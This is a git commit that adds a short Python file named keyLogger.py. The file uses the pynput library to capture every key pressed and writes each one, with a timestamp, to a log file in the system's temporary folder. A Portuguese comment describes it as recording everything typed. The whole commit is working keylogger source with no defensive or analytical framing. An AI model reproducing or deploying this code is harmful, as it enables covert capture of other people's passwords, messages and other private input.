c252316235f047a238067389a585177b8c1741f7
LuizMosciaro <edu.mosciaro@live.com>
2022-07-29 22:41:35 -0400

    v1

---
+++ keyLogger.py
@@ -0,0 +1,15 @@
+from pynput.keyboard import Listener
+import logging
+import tempfile
+
+#Cria um scrip na pasta temp da maquina e registra tudo que se clicou
+logging.basicConfig(filename=(tempfile.gettempdir() + "\keylogs.txt"),
+	level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+def on_press(key):
+    logging.info(str(key))
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
+
